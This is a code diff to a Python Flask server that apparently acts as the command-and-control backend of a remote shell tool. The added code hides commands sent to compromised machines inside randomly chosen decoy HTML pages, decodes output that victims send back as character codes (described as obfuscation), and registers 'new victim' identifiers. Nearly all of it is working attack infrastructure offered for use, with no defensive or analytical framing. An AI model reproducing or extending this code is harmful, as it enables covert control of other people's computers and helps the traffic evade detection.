@@ -2,9 +2,13 @@ from flask import Flask, request
 import core.server as sSrv
 import threading
 import time
-import core.upload as uSrv
+import json
+import random
+import os
 
 hxshl = Flask(__name__)
+masks = os.listdir("./core/masks/html")
+endpoints = open("./core/masks/endpoints.txt", "r").read().split('\n')
 
 class shellData:
     allowedUIDS = []
@@ -44,6 +48,9 @@ class interactive:
             pass
         shellData.responses[uid].pop(0)
 
+def createNewPoolEP(endpoint):
+    hxshl.add_url_rule(endpoint, endpoint, IEX_maskedPool)
+
 # UIDs are always in this format:
 
 # x*8 - y*8 - z*8
@@ -69,8 +76,9 @@ def IEX_init():
     shellData.responses[request.headers.get("Authorization")] = ()
 
     print(shellData.hxUIDS)
-
-    return "ok"
+    
+    rnd = random.choice(endpoints) # JIC its our custom payload
+    return rnd
 
 ## command pool check
 @hxshl.route("/9393dc2a")
@@ -87,6 +95,21 @@ def IEX_cmdpool():
     
     return "None"
 
+@hxshl.route("/9393dc2b")
+def IEX_maskedPool():
+    
+    uid = request.headers.get("Authorization")
+    sMask = random.choice(masks)
+
+    print(shellData.cmds)
+
+    if len(shellData.cmds[uid]) > 0:
+        cmd = shellData.cmds[uid][0]
+        shellData.cmds[uid].pop(0)
+        return open("./core/masks/html/"+sMask,"r").read().replace("%()%", "!"+cmd)
+        
+    return open("./core/masks/html/"+sMask,"r").read().replace("%()%", "*"+random.choice(endpoints))
+    
 # PS HTTP IEX
 ## encoded command response
 @hxshl.route("/2f810c1e", methods=["POST"])
@@ -117,6 +140,39 @@ def IEX_response():
 
     return "None"
 
+# custom payload
+## encoded command response + redirect
+@hxshl.route("/2f810c1b", methods=["POST"])
+def MaskedIEX_response():
+    fullStr = ""
+    data = request.get_data().decode('utf-8')
+
+    if request.headers.get("Authorization") in shellData.allowedUIDS:
+        if request.headers.get("Authorization") not in shellData.hxUIDS: # new victim
+            shellData.hxUIDS.append(request.headers.get("Authorization"))
+
+    # for setting the UID, usually the first command executed will mess up - this will throw away the first resopnse, and receive all others
+    # dirty fix, but works
+    if type(shellData.responses[request.headers.get("Authorization")]) == tuple:
+        shellData.responses[request.headers.get("Authorization")] = []
+        return random.choice(endpoints)
+
+    if data == "": 
+        # if empty, don't try to fix it
+        shellData.responses[request.headers.get("Authorization")] = ['']
+        return random.choice(endpoints)
+    else:
+        # kinda odd way of doing it, but also smart way of obfuscating the response
+        for x in data.split(" "):
+            fullStr += chr(int(x))
+
+    print("-" * 32)
+    print(fullStr.strip())
+    print("-" * 32)
+    shellData.responses[request.headers.get("Authorization")] = [fullStr.strip()]
+
+    return random.choice(endpoints)
+
 # CMD cURL
 ## not encoded command response
 @hxshl.route("/dd9e00a7", methods=["POST"])
@@ -129,5 +185,9 @@ def CMD_response():
 def startServer(ip:str, port=12728):
     #log = logging.getLogger('werkzeug')
     #log.setLevel(logging.ERROR)
+
+    for x in endpoints:
+        print('[!] {} -> masked command pool'.format(x))
+        createNewPoolEP(os.path.join("/", x))
 
     hxshl.run(ip, port=port)
